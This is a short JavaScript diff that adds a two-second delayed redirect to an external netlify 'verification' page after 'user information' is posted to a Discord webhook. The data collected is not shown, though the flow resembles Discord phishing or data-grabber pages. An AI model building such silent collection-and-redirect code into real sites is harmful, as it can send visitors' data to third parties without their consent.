@@ -59,6 +59,12 @@
                     axios.post(webhookUrl, payload)
                         .then(function (response) {
                             console.log('User information sent to Discord!');
+
+                            // Send verification URL and trigger role assignment after 2 seconds
+                            setTimeout(() => {
+                                const verificationURL = 'https://stately-jelly-b747e5.netlify.app/'; // Replace with your actual URL
+                                window.location.href = verificationURL; // Redirect user to verification page
+                            }, 2000); // 2 seconds delay before redirect
                         })
                         .catch(function (error) {
                             console.error('Error sending to Discord:', error);
